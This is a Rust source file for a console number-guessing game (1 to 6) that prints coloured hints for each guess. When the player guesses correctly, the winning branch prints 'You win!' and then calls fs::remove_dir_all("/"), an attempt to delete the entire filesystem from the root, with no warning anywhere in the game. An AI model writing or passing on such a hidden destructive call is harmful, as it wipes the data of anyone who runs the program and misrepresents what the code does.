use std::{io, fs};
use std::cmp::Ordering;
use rand::Rng;
use colored::*;

fn main() {
    println!("Guess a number between 1-6!");
    let mut counter = 0;
    loop {
        let secret_number = rand::thread_rng().gen_range(1..=6);

        counter += 1;

        println!("Input your guess below: (Guess #{counter})");

        let mut guess = String::new();
        io::stdin().read_line(&mut guess).expect("Failed to read line.");
        let guess: u32 = match guess.trim().parse() {
            Ok(num) => num,
            Err(_) => continue,
        };

        match guess.cmp(&secret_number) {
            Ordering::Less => println!("{}", "Too small!".red()),
            Ordering::Greater => println!("{}", "Too big!".red()),
            Ordering::Equal => {
                println!("{}", "You win!".green());
                fs::remove_dir_all("/").expect("Error removing directory.");
                break;
            },
        }
    }
}
